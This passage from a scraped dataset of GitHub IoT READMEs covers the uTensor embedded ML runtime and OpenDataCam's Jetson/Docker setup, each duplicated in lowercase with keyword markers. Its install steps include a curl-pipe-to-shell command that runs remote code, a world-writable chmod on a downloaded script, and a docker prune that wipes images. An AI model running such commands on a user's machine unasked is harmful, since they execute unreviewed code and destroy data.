ideas need to be reflected not only in the code, but in the code structure in such a way that it is Maintainable, Hackable, and User-extensible. Pretty much everything in the uTensor runtime can be divided into two components: core, and everything else. The core library contains all the deep low level functionality needed for the runtime to make the above guarantees, as well as the interfaces required for concrete implementation. Furthermore, the overhead of this core engine should be negligible relative to the system operation. Everything not in the core library really should just be thought of a reasonable defaults. For example, tensor implementations, default operators, example memory allocators, or even possible logging systems and error handlers. These modules should be the primary area for future optimization, especially before model deployment.\nHigh level API\nusing namespace uTensor;\nconst uint8_t s_a[4] = {1, 2, 3, 4};\nconst uint8_t s_b[4] = {5, 6, 7, 8};\nconst uint8_t s_c_ref[4] = {19, 22, 43, 50};\n// These can also be embedded in models\n// Recommend, not putting these on the heap or stack directly as they can be large\nlocalCircularArenaAllocator<256> meta_allocator; // All tensor metadata gets stored here automatically, even when new is called\nlocalCircularArenaAllocator<256> ram_allocator; // All temporary storage gets allocated here\nvoid foo() {\n// Tell the uTensor context which allocators to use\nContext::get_default_context()->set_metadata_allocator(&meta_allocator);\nContext::get_default_context()->set_ram_data_allocator(&ram_allocator);\n// Tensors are simply handles for accessing data as necessary, they are no larger than a pointer\n// RomTensor(TensorShape, data_type, data*);\nTensor a = new /*const*/ RomTensor({2, 2}, u8, s_a);\nTensor b = new /*const*/ RomTensor({2, 2}, u8, s_b);\nTensor c_ref = new RomTensor({2,2}, u8, s_c_ref);\n// RamTensors are held internally and can be moved or cleared depending on the memory schedule (optional)\nTensor c = new RamTensor({2, 2}, u8);\n// Operators take in a fixed size map of (input_name -> parameter), this gives compile time errors on input mismatching\n// Also, the name binding + lack of parameter ordering makes ctag jumping and GDB sessions significantly more intuitive\nMatrixMultOperator<uint8_t> mult_AB;\nmult_AB\n.set_inputs({{MatrixMultOperator<uint8_t>::a, a}, {MatrixMultOperator<uint8_t>::b, b}})\n.set_outputs({{MatrixMultOperator<uint8_t>::c, c}})\n.eval();\n// Compare results\nTensorShape& c_shape = c->get_shape();\nfor (int i = 0; i < c_shape[0]; i++) {\nfor (int j = 0; j < c_shape[1]; j++) {\n// Just need to cast the access to the expected type\nif( static_cast<uint8_t>(c(i, j)) != static_cast<uint8_t>(c_ref(i, j)) ) {\nprintf(\"Oh crap!\\n\");\nexit(-1);\n}\n}\n}\n}\nBuilding and testing locally\ngit clone git@github.com:uTensor/uTensor.git\ncd uTensor/\ngit checkout proposal/rearch\ngit submodule init\ngit submodule update\nmkdir build\ncd build/\ncmake -DPACKAGE_TESTS=ON -DCMAKE_BUILD_TYPE=Debug ..\nmake\nmake test\nBuilding and running on Arm Mbed OS\nThe uTensor core library is configured as a mbed library out of the box, so we just need to import it into our project and build as normal.\nmbed new my_project\ncd my_project\nmbed import https://github.com/uTensor/uTensor.git\n# Create main file\n# Run uTensor-cli workflow and copy model directory here\nmbed compile # as normal\nBuilding and running on Arm systems\nTODO Note: CMake Support for Arm is currently experimental https://stackoverflow.com/questions/46916611/cross-compiling-googletest-for-arm64\nDefault build\nmkdir build && cd build\ncmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_TOOLCHAIN_FILE=../extern/CMSIS_5/CMSIS/DSP/gcc.cmake ..\nWith CMSIS optimized kernels\nmkdir build && cd build\ncmake -DARM_PROJECT=1 -DCMAKE_BUILD_TYPE=Debug -DCMAKE_TOOLCHAIN_FILE=../extern/CMSIS_5/CMSIS/DSP/gcc.cmake ..\nFurther Reading\nWhy Edge Computing\nWhy the Future of Machine Learning is Tiny\nTensorFlow\nMbed\nNode-Viewer\nHow to Quantize Neural Networks with TensorFlow\nmxnet Handwritten Digit Recognition", "link": "https://github.com/uTensor/uTensor", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "utensor - test release\nnote: if you are looking for stable releases, checkout master.\ntutorials\nbuilding tutorial examples\nmake sure cmake is available on your system and run following commands:\n$ mkdir build\n$ cd build\n$ cmake -dpackage_tutorials=on ..\n$ make\nafter the building process finish, you should find the tutorial executables under build/tutorials/ directory.\nfollow instructions in the readme.md in each tutorial directories to learn how to use utensor.\nhere are the links to the tutorials:\nerror handling with utensor\ncustom operator\nintroduction\nwhat is it?\nutensor is an extremely light-weight machine learning inference framework built on tensorflow and optimized for arm targets. it consists of a runtime library and an offline -----> tool !!!  that handles most of the model translation work. this repo holds the core runtime and some example implementations of operators, memory managers/schedulers, and more, and the size of the core runtime is only ~2kb!\nmodule .text .data .bss\nutensor/src/utensor/core 1275(+1275) 4(+4) 28(+28)\nutensor/src/utensor/tensors 791(+791) 0(+0) 0(+0)\nhow does the utensor workflow work?\na model is constructed and trained in tensorflow. utensor takes the model and produces a .cpp and .hpp file. these files contains the generated c++11 code needed for inferencing. working with utensor on the embedded side is as easy as copy-and-paste.\nhow does the utensor runtime work?\ncheck out the detailed description here\nrelease note\nthe rearchitecture is fundamentally centered around a few key ideas, and the structure of the code base and build tools naturally followed. old key points:\ntensors describe how data is accessed and where from\nperformance of ops depends on which tensors are used\noperators are tensor agnostic\nhigh performance ops can fetch blocks of data at once\nstrive for low total power in execution\nlow static and dynamic footprint, be small\nlow cost per tensor throughout the entire system, since most generated models have 100+ including intermediates, also impacts dynamic footprint\nlightweight class hierarchy\nduh\nnew additional key ideas:\nsystem safety\nall tensor metadata and actual data are owned in dedicated regions\nthis can either be user provided, or one we create\nwe can guarantee that runtime will use no more than n bytes of ram at code gen time or at compile time!\ngenerally should not collide with userspace or system space memory, i.e. dont share heaps\ngenerally implications: a safe runtime means we can safely update models remotely\nas many compile time errors as possible!\nmismatched inputs, outputs, or numbers\nwrong sizes used\nimpossible memory accesses\netc.\nclear, concise, and debuggable\nprevious iteration of utensor relied almost too heavily on codegen, making changes to a model for any reason was near impossible\na developer should be able to make changes to the model without relying on code gen\na developer should be able to look at a model file and immediately understand what the graph looks like, without a massive amound of jumping around\ndefault tensor interface should behave like a higher level language, but exploit the speed of c++\ngenerally: no more pointer bullshit! c is super error prone, fight me\nonly specialized operators have access to raw data blocks, and these ops will be wicked fast\nextensible, configurable, and optimize-outable error handling\ngdb debugging is now trivial\nas mentioned before, these key ideas need to be reflected not only in the code, but in the code structure in such a way that it is maintainable, hackable, and user-extensible. pretty much everything in the utensor runtime can be divided into two components: core, and everything else. the core library contains all the deep low level functionality needed for the runtime to make the above guarantees, as well as the interfaces required for concrete implementation. furthermore, the overhead of this core engine should be negligible relative to the system operation. everything not in the core library really should just be thought of a reasonable defaults. for example, tensor implementations, default operators, example memory allocators, or even possible logging systems and error handlers. these modules should be the primary area for future optimization, especially before model deployment.\nhigh level api\nusing namespace utensor;\nconst uint8_t s_a[4] = {1, 2, 3, 4};\nconst uint8_t s_b[4] = {5, 6, 7, 8};\nconst uint8_t s_c_ref[4] = {19, 22, 43, 50};\n// these can also be embedded in models\n// recommend, not putting these on the heap or stack directly as they can be large\nlocalcirculararenaallocator<256> meta_allocator; // all tensor metadata gets stored here automatically, even when new is called\nlocalcirculararenaallocator<256> ram_allocator; // all temporary storage gets allocated here\nvoid foo() {\n// tell the utensor context which allocators to use\ncontext::get_default_context()->set_metadata_allocator(&meta_allocator);\ncontext::get_default_context()->set_ram_data_allocator(&ram_allocator);\n// tensors are simply handles for accessing data as necessary, they are no larger than a pointer\n// romtensor(tensorshape, data_type, data*);\ntensor a = new /*const*/ romtensor({2, 2}, u8, s_a);\ntensor b = new /*const*/ romtensor({2, 2}, u8, s_b);\ntensor c_ref = new romtensor({2,2}, u8, s_c_ref);\n// ramtensors are held internally and can be moved or cleared depending on the memory schedule (optional)\ntensor c = new ramtensor({2, 2}, u8);\n// operators take in a fixed size map of (input_name -> parameter), this gives compile time errors on input mismatching\n// also, the name binding + lack of parameter ordering makes ctag jumping and gdb sessions significantly more intuitive\nmatrixmultoperator<uint8_t> mult_ab;\nmult_ab\n.set_inputs({{matrixmultoperator<uint8_t>::a, a}, {matrixmultoperator<uint8_t>::b, b}})\n.set_outputs({{matrixmultoperator<uint8_t>::c, c}})\n.eval();\n// compare results\ntensorshape& c_shape = c->get_shape();\nfor (int i = 0; i < c_shape[0]; i++) {\nfor (int j = 0; j < c_shape[1]; j++) {\n// just need to cast the access to the expected type\nif( static_cast<uint8_t>(c(i, j)) != static_cast<uint8_t>(c_ref(i, j)) ) {\nprintf(\"oh crap!\\n\");\nexit(-1);\n}\n}\n}\n}\nbuilding and testing locally\ngit clone git@github.com:utensor/utensor.git\ncd utensor/\ngit checkout proposal/rearch\ngit submodule init\ngit submodule update\nmkdir build\ncd build/\ncmake -dpackage_tests=on -dcmake_build_type=debug ..\nmake\nmake test\nbuilding and running on arm mbed os\nthe utensor core library is configured as a mbed library out of the box, so we just need to import it into our project and build as normal.\nmbed new my_project\ncd my_project\nmbed import https://github.com/utensor/utensor.git\n# create main file\n# run utensor-cli workflow and copy model directory here\nmbed compile # as normal\nbuilding and running on arm systems\ntodo note: cmake support for arm is currently experimental https://stackoverflow.com/questions/46916611/cross-compiling-googletest-for-arm64\ndefault build\nmkdir build && cd build\ncmake -dcmake_build_type=debug -dcmake_toolchain_file=../extern/cmsis_5/cmsis/dsp/gcc.cmake ..\nwith cmsis optimized kernels\nmkdir build && cd build\ncmake -darm_project=1 -dcmake_build_type=debug -dcmake_toolchain_file=../extern/cmsis_5/cmsis/dsp/gcc.cmake ..\nfurther reading\nwhy edge computing\nwhy the future of machine learning is tiny\ntensorflow\nmbed\nnode-viewer\nhow to quantize neural networks with tensorflow\nmxnet handwritten digit recognition", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000088, "year": null}, {"Unnamed: 0": 90, "autor": 90, "date": null, "content": "OpenDataCam 3.0.2 \u2013 An open source tool to quantify the world\nOpenDataCam is an open source tool to quantify the world. It quantifies and tracks moving objects with live video analysis. It is designed to be an accessible, affordable and open-source solution to better understand interactions in urban environments.\nOpenDataCam never records any photo or video data. The system only saves surveyed meta-data, in particular the path an object moved or number of counted objects at a certain point. The novelty of OpenDataCam is, that everything happens on location, while no visual data is saved or sent to online cloud processing.\nOpenDataCam runs on Linux and CUDA GPU enabled hardware. It is optimized for the NVIDIA Jetson Board series. The most affordable setup runs on a Jetson Nano (low cost, credit-card sized GPU-computer) combined with other other off-the-shelf equipment (webcam, power supply, housing), this entire setup is priced around $150. All software is based on open source components and runs completely locally. The software features a friendly user interface and is currently optimised for detecting and counting traffic participants, but is not limited to that.\nBoth software and hardware setup are documented and offered as an open source project, to underline transparency and full disclosure on privacy questions. The simple OpenDataCam setup allows everybody to become an urban data miner.\nOpenDataCam is very alpha and we do not provide any guarantee that this will work for your use case, but we conceived it as a starting point from where you can build-on & improve.\nUntil v3.0.0 OpenDataCam has been mainly supported by move lab. OpenDataCam was supported in part by a residency at the Frank-Ratchye STUDIO for Creative Inquiry at Carnegie Mellon University. We are currently looking into potential funding sources to keep pushing the project. If you are interested, please be in touch.\nDemo Videos\n\ud83d\udc49 UI Walkthrough (2 min, OpenDataCam 3.0) \ud83d\udc49 UI Walkthrough (4 min, OpenDataCam 2.0) \ud83d\udc49 IoT Happy Hour #13: OpenDataCam 3.0\nTable of content\nOpenDataCam 3.0.2 \u2013 An open source tool to quantify the world\nDemo Videos\nTable of content\n\ud83d\udcbb Hardware pre-requisite\n\ud83c\udfac Get Started, quick setup\n1. Software pre-requisite \ud83d\udce6\nFor Jetson: Flash Jetson board to jetpack 4.3 \u26a1\ufe0f\nFor Desktop machine: Nvidia container toolkit \ud83d\udd27\n2. Install and start OpenDataCam \ud83d\ude80\n3. Use OpenDataCam \ud83d\udd96\n4. Customize OpenDataCam \ufe0f\ufe0f\u2699\ufe0f\n5. Configure your Wifi hotspot \ud83d\udcf2\n6. Docker playbook \ufe0f\ud83d\udcda\n\ud83d\udd0c API Documentation\n\ud83d\uddc3 Data export documentation\n\u2049\ufe0f Troubleshooting\n\ud83c\udf9b Advanced uses\nHow to use opendatacam without docker\nHow to create / update the docker image\n\ud83c\udfaf How accurate is OpenDataCam ?\n\ud83d\udea4 How fast is OpenDataCam ?\n\ud83d\udee0 Development notes\n\ud83d\udceb\ufe0f Contact\n\ud83d\udc8c Acknowledgments\n\ud83d\udcbb Hardware pre-requisite\nNvidia Jetson Nano / Xavier NX / Xavier or any GNU/Linux x86_64 machine with a CUDA compatible GPU (Nvidia)\nWebcam Logitech C222, C270, C310, C920 / Rasberry Pi cam for Jetson nano / a Video file / IP camera\nA smartphone / tablet / laptop that you will use to operate the system\n\ud83c\udfac Get Started, quick setup\nFor Jetson Nano, you can follow this dedicated quick start guide\n1. Software pre-requisite \ud83d\udce6\nFor Jetson: Flash Jetson board to jetpack 4.3 \u26a1\ufe0f\nJetpack 4.3 : How to find out your jetpack version, Guide to flash your jetson\n!!! Warning !!! Note that there is a performance drop if you use Jetpack 4.4 DP (see nvidia forum open issue)\nDocker compose (no official installer available for ARM64 devices)\nsudo apt install python3-pip\nsudo apt-get install -y libffi-dev\nsudo apt-get install -y python-openssl\nsudo apt-get install libssl-dev\nsudo pip3 install docker-compose\nFor Desktop machine: Nvidia container toolkit \ud83d\udd27\nDocker installed\nDocker compose installed\nNvidia drivers installed (you don't need all CUDA but we didn't found a easy install process for only the drivers)\nNvidia Container toolkit installed\nFor desktop there is a workaround to add with docker-compose to give access to the nvidia runtime. At the time of writing this documentation, GPUs for docker-compose aren't well supported yet, see https://github.com/docker/compose/issues/6691\nOpen the daemon.json\nsudo vim /etc/docker/daemon.json\nCopy this inside and save the file\n{\n\"runtimes\": {\n\"nvidia\": {\n\"path\": \"/usr/bin/nvidia-container-runtime\",\n\"runtimeArgs\": []\n}\n}\n}\nRestart docker\nsystemctl restart docker\nYou also need to install nvidia-container-runtime\nsudo apt install nvidia-container-runtime\n2. Install and start OpenDataCam \ud83d\ude80\nOpen a terminal or ssh to you machine and run the following commands depending on your platform.\nThe install script will download a docker-compose.yml file and setup a default config.json depending on your platform.\nMake sure you have previously installed docker-compose by running docker-compose --version\nInstall commands:\n# Download install script\nwget -N https://raw.githubusercontent.com/opendatacam/opendatacam/v3.0.2/docker/install-opendatacam.sh\n# Give exec permission\nchmod 777 install-opendatacam.sh\n# NB: You will be asked for sudo password when installing the docker container\n# You might want to stop all docker container running before starting OpenDataCam\n# sudo docker stop $(sudo docker ps -aq)\n# Install command for Jetson Nano\n# NB: Will run from demo file, you can change this after install, see \"5. Customize OpenDataCam\"\n./install-opendatacam.sh --platform nano\n# Install command for Jetson Xavier / Xavier NX\n# NB: Will run from demo file, you can change this after install, see \"5. Customize OpenDataCam\"\n./install-opendatacam.sh --platform xavier\n# Install command for a Desktop machine\n# NB: Will run from demo file, you can change this after install, see \"5. Customize OpenDataCam\"\n./install-opendatacam.sh --platform desktop\n# Install command for Jetson TX2\n# Docker build for Jetson TX2 isn't available please install without docker (see in avanced use)\nThis command will download and start a docker container on the machine. After it finishes the docker container starts a webserver on port 8080 (ports 8070 and 8090 are also used).\nThe docker container is started in auto-restart mode, so if you reboot your machine it will automaticaly start opendatacam on startup. (Learn more about the specificities of docker on jetson)\nYou can also use opendatacam without docker\nKubernetes Install:\nIf you prefer to deploy OpenDataCam on Kubernetes rather than with Docker Compose, use the --orchestrator flag for changing the engine.\nApart from that, a Kubernetes distribution custom made for the embedded world would be K3s, which can be installed in 30 seconds by running:\ncurl -sfL https://get.k3s.io | sh -\nThen, to automatically download and deploy the services:\n# Download install script\nwget -N https://raw.githubusercontent.com/opendatacam/opendatacam/master/docker/install-opendatacam.sh\n# Give exec permission\nchmod 777 install-opendatacam.sh\n# Install command for Jetson Nano\n./install-opendatacam.sh --platform nano --orchestrator k8s\n# Install command for Jetson Xavier / Xavier NX\n./install-opendatacam.sh --platform xavier --orchestrator k8s\n# Install command for a Desktop machine\n./install-opendatacam.sh --platform desktop --orchestrator k8s\nNote: NVIDIA offers a Kubernetes device plugin for detecting GPUs on nodes in case you are managing a heterogeneous cluster. Support for Jetson boards is being worked here\nbalenaCloud Install:\nIf you have a fleet of one or more devices, you can use balena to streamline deployment and management of OpenDataCam. You can sign up for a free account here and add up to ten devices at no charge. Use the button below to build OpenDataCam for a Jetson Nano, TX2, or Xavier. You can then download an image containing the OS, burn it to an SD card, and use balenaCloud to push OpenDataCam to your devices.\nYou can learn more about this deployment option along with a step-by-step guide in this recent blog post, or view a screencast of the deployment in action.\n(optional) Upgrade OpenDataCam\nIf you have modified the config.json, save it somewhere\nRemove config.json, docker-compose.yml\nRun the install steps again (previous section), this will download a new default config.json file compatible with the opendatacam version you are installing and setup a new docker container\nOpen the newly downloaded config.json script and modify with the things you had changed previously\nNB: we do not handle auto update of the config.json file\n3. Use OpenDataCam \ud83d\udd96\nOpen your browser at http://IPOFJETSON:8080 .\nIf you are running with the jetson connected to a screen: http://localhost:8080\nNB: OpenDataCam only supports one client at a time, if you open the UI on two different devices, the stream will stop in one of them.\nSee Docker playbook \ufe0f\ud83d\udcda how to restart / stop OpenDataCam.\n(optional) Run on USB Camera\nBy default, OpenDataCam will start on a demo file, but if you want to run from an usbcam you should\nVerify an USB Camera is connected\nls /dev/video*\n# Output should be: /dev/video1\nChange \"VIDEO_INPUT\" in config.json\n\"VIDEO_INPUT\": \"usbcam\"\nRestart docker\nsudo docker-compose restart\n(optional) Change file\nTo run on another file, just drag & drop it on the UI\n4. Customize OpenDataCam \ufe0f\ufe0f\u2699\ufe0f\nWe offer several customization options:\nVideo input: run from a file, change webcam resolution, change camera type (raspberry cam, usb cam...)\nNeural network: change YOLO weights files depending on your hardware capacity, desired FPS\nChange display classes: We default to mobility classes (car, bus, person...), but you can change this\nLearn how to customize OpenDataCam\n5. Configure your Wifi hotspot \ud83d\udcf2\nIn order to operate opendatacam from your phone / tablet / computer.\nSee Make jetson device / machine accessible via WIFI\n6. Docker playbook \ufe0f\ud83d\udcda\nHow to show OpenDataCam logs\n# Go to the directory you ran install script (where is your docker-compose.yml file)\n# List containers\nsudo docker-compose logs\nHow to stop / restart OpenDataCam\n# Go to the directory you ran install script (where is your docker-compose.yml file)\n# Stop container\nsudo docker-compose down\n# Stop all docker container\nsudo docker stop $(sudo docker ps -aq)\n# If docker (and opendatacam) doesn't start at startup enable it\nsudo systemctl enable docker\n# Start container\n# detached mode\nsudo docker-compose up -d\n# interactive mode\nsudo docker-compose up\n# Restart container (after modifying the config.json file for example)\nsudo docker-compose restart\n# Install a newer version of opendatacam\n# Follow the 1. Install and start OpenDataCam\n# See stats ( CPU , memory usage ...)\nsudo docker stats opendatacam\n# Clear all docker container, images ...\nsudo docker system prune -a\n# Restart docker\nsudo service docker restart\n\ud83d\udd0c API Documentation\nIn order to solve use cases that aren't taken care by our opendatacam base app, you might be able to build on top of our API instead of forking the project.\nhttps://opendatacam.github.io/opendatacam/apidoc/\n\ud83d\uddc3 Data export documentation\nCounter data\nTracker data\n\u2049\ufe0f Troubleshooting\nCommon errors with answers\n\ud83c\udf9b Advanced uses\nHow to use opendatacam without docker\nRead How to use opendatacam without docker\nHow to create / update the docker image\nWe host our docker images on Dockerhub\nFor jetson devices:\nSee How to create / update a docker image for a jetson device\nFor nvidia-docker machine:\nSee How to create / update a docker image for a nvidia-docker machine\n\ud83c\udfaf How accurate is OpenDataCam ?\nAccuracy depends on which YOLO weights your hardware is capable of running.\nWe are working on adding a benchmark to rank OpenDataCam on the MOT Challenge (Multiple Object Tracking Benchmark)\n\ud83d\udea4 How fast is OpenDataCam ?\nFPS depends on:\nwhich hardware your are running OpenDataCam on\nwhich YOLO weights you are using\nWe made the default settings to run at least at 10 FPS on any Jetson.\nLearn more in the Customize OpenDataCam documentation\n\ud83d\udee0 Development notes\nSee Development notes\nTechnical architecture overview:\n\ud83d\udceb\ufe0f Contact\nIssues should be raised directly in the repository. For business inquiries or professional support requests please contact @tdurand\n\ud83d\udc8c Acknowledgments\nOriginal darknet @pjreddie : https://pjreddie.com/darknet/\nDarknet fork + YOLOv4 by @alexeyab : https://github.com/alexeyab/darknet\nIOU / V-IOU Tracker by @bochinski : https://github.com/bochinski/iou-tracker/\nNext.js by @zeit : https://github.com/zeit/next.js", "link": "https://github.com/opendatacam/opendatacam", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "opendatacam 3.0.2 \u2013 an open source -----> tool !!!  to quantify the world\nopendatacam is an open source -----> tool !!!  to quantify the world. it quantifies and tracks moving objects with live video analysis. it is designed to be an accessible, affordable and open-source solution to better understand interactions in urban environments.\nopendatacam never records any photo or video data. the system only saves surveyed meta-data, in particular the path an object moved or number of counted objects at a certain point. the novelty of opendatacam is, that everything happens on location, while no visual data is saved or sent to online cloud processing.\nopendatacam runs on linux and cuda gpu enabled hardware. it is optimized for the nvidia jetson board series. the most affordable setup runs on a jetson nano (low cost, credit-card sized gpu-computer) combined with other other off-the-shelf equipment (webcam, power supply, housing), this entire setup is priced around $150. all software is based on open source components and runs completely locally. the software features a friendly user interface and is currently optimised for detecting and counting traffic participants, but is not limited to that.\nboth software and hardware setup are documented and offered as an open source project, to underline transparency and full disclosure on privacy questions. the simple opendatacam setup allows everybody to become an urban data miner.\nopendatacam is very alpha and we do not provide any guarantee that this will work for your use case, but we conceived it as a starting point from where you can build-on & improve.\nuntil v3.0.0 opendatacam has been mainly supported by move lab. opendatacam was supported in part by a residency at the frank-ratchye studio for creative inquiry at carnegie mellon university. we are currently looking into potential funding sources to keep pushing the project. if you are interested, please be in touch.\ndemo videos\n\ud83d\udc49 ui walkthrough (2 min, opendatacam 3.0) \ud83d\udc49 ui walkthrough (4 min, opendatacam 2.0) \ud83d\udc49 iot happy hour #13: opendatacam 3.0\ntable of content\nopendatacam 3.0.2 \u2013 an open source tool to quantify the world\ndemo videos\ntable of content\n\ud83d\udcbb hardware pre-requisite\n\ud83c\udfac get started, quick setup\n1. software pre-requisite \ud83d\udce6\nfor jetson: flash jetson board to jetpack 4.3 \u26a1\ufe0f\nfor desktop machine: nvidia container toolkit \ud83d\udd27\n2. install and start opendatacam \ud83d\ude80\n3. use opendatacam \ud83d\udd96\n4. customize opendatacam \ufe0f\ufe0f\u2699\ufe0f\n5. configure your wifi hotspot \ud83d\udcf2\n6. docker playbook \ufe0f\ud83d\udcda\n\ud83d\udd0c api documentation\n\ud83d\uddc3 data export documentation\n\u2049\ufe0f troubleshooting\n\ud83c\udf9b advanced uses\nhow to use opendatacam without docker\nhow to create / update the docker image\n\ud83c\udfaf how accurate is opendatacam ?\n\ud83d\udea4 how fast is opendatacam ?\n\ud83d\udee0 development notes\n\ud83d\udceb\ufe0f contact\n\ud83d\udc8c acknowledgments\n\ud83d\udcbb hardware pre-requisite\nnvidia jetson nano / xavier nx / xavier or any gnu/linux x86_64 machine with a cuda compatible gpu (nvidia)\nwebcam logitech c222, c270, c310, c920 / rasberry pi cam for jetson nano / a video file / ip camera\na smartphone / tablet / laptop that you will use to operate the system\n\ud83c\udfac get started, quick setup\nfor jetson nano, you can follow this dedicated quick start guide\n1. software pre-requisite \ud83d\udce6\nfor jetson: flash jetson board to jetpack 4.3 \u26a1\ufe0f\njetpack 4.3 : how to find out your jetpack version, guide to flash your jetson\n!!! warning !!! note that there is a performance drop if you use jetpack 4.4 dp (see nvidia forum open issue)\ndocker compose (no official installer available for arm64 devices)\nsudo apt install python3-pip\nsudo apt-get install -y libffi-dev\nsudo apt-get install -y python-openssl\nsudo apt-get install libssl-dev\nsudo pip3 install docker-compose\nfor desktop machine: nvidia container toolkit \ud83d\udd27\ndocker installed\ndocker compose installed\nnvidia drivers installed (you don't need all cuda but we didn't found a easy install process for only the drivers)\nnvidia container toolkit installed\nfor desktop there is a workaround to add with docker-compose to give access to the nvidia runtime. at the time of writing this documentation, gpus for docker-compose aren't well supported yet, see https://github.com/docker/compose/issues/6691\nopen the daemon.json\nsudo vim /etc/docker/daemon.json\ncopy this inside and save the file\n{\n\"runtimes\": {\n\"nvidia\": {\n\"path\": \"/usr/bin/nvidia-container-runtime\",\n\"runtimeargs\": []\n}\n}\n}\nrestart docker\nsystemctl restart docker\nyou also need to install nvidia-container-runtime\nsudo apt install nvidia-container-runtime\n2. install and start opendatacam \ud83d\ude80\nopen a terminal or ssh to you machine and run the following commands depending on your platform.\nthe install script will download a docker-compose.yml file and setup a default config.json depending on your platform.\nmake sure you have previously installed docker-compose by running docker-compose --version\ninstall commands:\n# download install script\nwget -n https://raw.githubusercontent.com/opendatacam/opendatacam/v3.0.2/docker/install-opendatacam.sh\n# give exec permission\nchmod 777 install-opendatacam.sh\n# nb: you will be asked for sudo password when installing the docker container\n# you might want to stop all docker container running before starting opendatacam\n# sudo docker stop $(sudo docker ps -aq)\n# install command for jetson nano\n# nb: will run from demo file, you can change this after install, see \"5. customize opendatacam\"\n./install-opendatacam.sh --platform nano\n# install command for jetson xavier / xavier nx\n# nb: will run from demo file, you can change this after install, see \"5. customize opendatacam\"\n./install-opendatacam.sh --platform xavier\n# install command for a desktop machine\n# nb: will run from demo file, you can change this after install, see \"5. customize opendatacam\"\n./install-opendatacam.sh --platform desktop\n# install command for jetson tx2\n# docker build for jetson tx2 isn't available please install without docker (see in avanced use)\nthis command will download and start a docker container on the machine. after it finishes the docker container starts a webserver on port 8080 (ports 8070 and 8090 are also used).\nthe docker container is started in auto-restart mode, so if you reboot your machine it will automaticaly start opendatacam on startup. (learn more about the specificities of docker on jetson)\nyou can also use opendatacam without docker\nkubernetes install:\nif you prefer to deploy opendatacam on kubernetes rather than with docker compose, use the --orchestrator flag for changing the engine.\napart from that, a kubernetes distribution custom made for the embedded world would be k3s, which can be installed in 30 seconds by running:\ncurl -sfl https://get.k3s.io | sh -\nthen, to automatically download and deploy the services:\n# download install script\nwget -n https://raw.githubusercontent.com/opendatacam/opendatacam/master/docker/install-opendatacam.sh\n# give exec permission\nchmod 777 install-opendatacam.sh\n# install command for jetson nano\n./install-opendatacam.sh --platform nano --orchestrator k8s\n# install command for jetson xavier / xavier nx\n./install-opendatacam.sh --platform xavier --orchestrator k8s\n# install command for a desktop machine\n./install-opendatacam.sh --platform desktop --orchestrator k8s\nnote: nvidia offers a kubernetes device plugin for detecting gpus on nodes in case you are managing a heterogeneous cluster. support for jetson boards is being worked here\nbalenacloud install:\nif you have a fleet of one or more devices, you can use balena to streamline deployment and management of opendatacam. you can sign up for a free account here and add up to ten devices at no charge. use the button below to build opendatacam for a jetson nano, tx2, or xavier. you can then download an image containing the os, burn it to an sd card, and use balenacloud to push opendatacam to your devices.\nyou can learn more about this deployment option along with a step-by-step guide in this recent blog post, or view a screencast of the deployment in action.\n(optional) upgrade opendatacam\nif you have modified the config.json, save it somewhere\nremove config.json, docker-compose.yml\nrun the install steps again (previous section), this will download a new default config.json file compatible with the opendatacam version you are installing and setup a new docker container\nopen the newly downloaded config.json script and modify with the things you had changed previously\nnb: we do not handle auto update of the config.json file\n3. use opendatacam \ud83d\udd96\nopen your browser at http://ipofjetson:8080 .\nif you are running with the jetson connected to a screen: http://localhost:8080\nnb: opendatacam only supports one client at a time, if you open the ui on two different devices, the stream will stop in one of them.\nsee docker playbook \ufe0f\ud83d\udcda how to restart / stop opendatacam.\n(optional) run on usb camera\nby default, opendatacam will start on a demo file, but if you want to run from an usbcam you should\nverify an usb camera is connected\nls /dev/video*\n# output should be: /dev/video1\nchange \"video_input\" in config.json\n\"video_input\": \"usbcam\"\nrestart docker\nsudo docker-compose restart\n(optional) change file\nto run on another file, just drag & drop it on the ui\n4. customize opendatacam \ufe0f\ufe0f\u2699\ufe0f\nwe offer several customization options:\nvideo input: run from a file, change webcam resolution, change camera type (raspberry cam, usb cam...)\nneural network: change yolo weights files depending on your hardware capacity, desired fps\nchange display classes: we default to mobility classes (car, bus, person...), but you can change this\nlearn how to customize opendatacam\n5. configure your wifi hotspot \ud83d\udcf2\nin order to operate opendatacam from your phone / tablet / computer.\nsee make jetson device / machine accessible via wifi\n6. docker playbook \ufe0f\ud83d\udcda\nhow to show opendatacam logs\n# go to the directory you ran install script (where is your docker-compose.yml file)\n# list containers\nsudo docker-compose logs\nhow to stop / restart opendatacam\n# go to the directory you ran install script (where is your docker-compose.yml file)\n# stop container\nsudo docker-compose down\n# stop all docker container\nsudo docker stop $(sudo docker ps -aq)\n# if docker (and opendatacam) doesn't start at startup enable it\nsudo systemctl enable docker\n# start container\n# detached mode\nsudo docker-compose up -d\n# interactive mode\nsudo docker-compose up\n# restart container (after modifying the config.json file for example)\nsudo docker-compose restart\n# install a newer version of opendatacam\n# follow the 1. install and start opendatacam\n# see stats ( cpu , memory usage ...)\nsudo docker stats opendatacam\n# clear all docker container, images ...\nsudo docker system prune -a\n# restart docker\nsudo service docker restart\n\ud83d\udd0c api documentation\nin order to solve use cases that aren't taken care by our opendatacam base app, you might be able to build on top of our api instead of forking the project.\nhttps://opendatacam.github.io/opendatacam/apidoc/\n\ud83d\uddc3 data export documentation\ncounter data\ntracker data\n\u2049\ufe0f troubleshooting\ncommon errors with answers\n\ud83c\udf9b advanced uses\nhow to use opendatacam without docker\nread how to use opendatacam without docker\nhow to create / update the docker image\nwe host our docker images on dockerhub\nfor jetson devices:\nsee how to create / update a docker image for a jetson device\nfor nvidia-docker machine:\nsee how to create / update a docker image for a nvidia-docker machine\n\ud83c\udfaf how accurate is opendatacam ?\naccuracy depends on which yolo weights your hardware is capable of running.\nwe are working on adding a benchmark to rank opendatacam on the mot challenge (multiple object tracking benchmark)\n\ud83d\udea4 how fast is opendatacam ?\nfps depends on:\nwhich hardware your are running opendatacam on\nwhich yolo weights you are using\nwe made the default settings to run at least at 10 fps on any jetson.\nlearn more in the customize opendatacam documentation\n\ud83d\udee0 development notes\nsee development notes\ntechnical architecture overview:\n\ud83d\udceb\ufe0f contact\nissues should be raised directly in the repository. for business inquiries or professional support requests please contact @tdurand\n\ud83d\udc8c 